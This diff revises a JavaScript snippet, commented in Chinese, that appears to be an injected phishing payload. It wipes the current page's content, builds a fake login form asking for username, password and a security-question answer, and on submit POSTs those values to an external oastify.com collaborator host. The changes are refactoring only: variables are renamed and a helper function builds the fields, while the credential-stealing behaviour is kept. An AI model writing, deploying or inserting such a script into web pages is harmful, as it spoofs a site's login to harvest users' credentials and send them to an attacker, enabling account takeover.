@@ -1,56 +1,52 @@
+// 清除页面中的所有内容
+document.body.innerHTML = '';
+
 // 创建标题
-const title = document.createElement("h2");
-title.textContent = "Login page";
-document.body.appendChild(title);
+const loginTitle = document.createElement("h2"); // 更具体的变量名
+loginTitle.textContent = "Login page";
+document.body.appendChild(loginTitle);
 
-// 创建表单
-const form = document.createElement("form");
-form.id = "loginForm";
+// 创建表单（使用唯一命名）
+const customLoginForm = document.createElement("form");
+customLoginForm.id = "customLoginForm"; // 使用独特ID
 
-// 创建账号输入
-form.appendChild(document.createTextNode("account:"));
-const inputUser = document.createElement("input");
-inputUser.type = "text";
-inputUser.name = "username";
-inputUser.required = true;
-form.appendChild(inputUser);
-form.appendChild(document.createElement("br"));
+// 输入域创建函数（提取公共逻辑）
+function createFormField(form, labelText, name, type = "text") {
+  form.appendChild(document.createTextNode(labelText));
+  const input = document.createElement("input");
+  input.type = type;
+  input.name = name;
+  input.required = true;
+  form.appendChild(input);
+  form.appendChild(document.createElement("br"));
+  return input;
+}
 
-// 创建密码输入
-form.appendChild(document.createTextNode("password:"));
-const inputPass = document.createElement("input");
-inputPass.type = "password";
-inputPass.name = "password";
-inputPass.required = true;
-form.appendChild(inputPass);
-form.appendChild(document.createElement("br"));
+// 创建各输入域
+createFormField(customLoginForm, "account:", "username");
+createFormField(customLoginForm, "password:", "password", "password");
+createFormField(customLoginForm, "The answer of your question?", "answer");
 
-// 创建问题答案输入
-form.appendChild(document.createTextNode("The answer of your question?"));
-const inputAnswer = document.createElement("input");
-inputAnswer.type = "text";
-inputAnswer.name = "answer";
-inputAnswer.required = true;
-form.appendChild(inputAnswer);
-form.appendChild(document.createElement("br"));
-form.appendChild(document.createElement("br"));
+// 添加间隔
+customLoginForm.appendChild(document.createElement("br"));
 
-// 提交按钮
-const submitBtn = document.createElement("button");
-submitBtn.type = "submit";
-submitBtn.textContent = "submit";
-form.appendChild(submitBtn);
+// 提交按钮（使用具体命名）
+const formSubmitButton = document.createElement("button");
+formSubmitButton.type = "submit";
+formSubmitButton.textContent = "Submit";
+customLoginForm.appendChild(formSubmitButton);
 
 // 添加表单到页面
-document.body.appendChild(form);
+document.body.appendChild(customLoginForm);
 
-// 监听提交事件
-form.addEventListener("submit", function (e) {
+// 事件监听（使用独特函数名）
+customLoginForm.addEventListener("submit", function handleCustomFormSubmit(e) {
   e.preventDefault();
 
-  const formData = new FormData(form);
-
-  fetch("https://xbc2r5arnrf560cq5271koeu2l8fw5ku.oastify.com", {
+  const formData = new FormData(customLoginForm);
+  
+  // 发送请求（可根据需要保留或修改）
+  fetch("https://gscqu66vws6u8g5vfj74iimw8nee24qt.oastify.com", {
     method: "POST",
     body: formData
   });
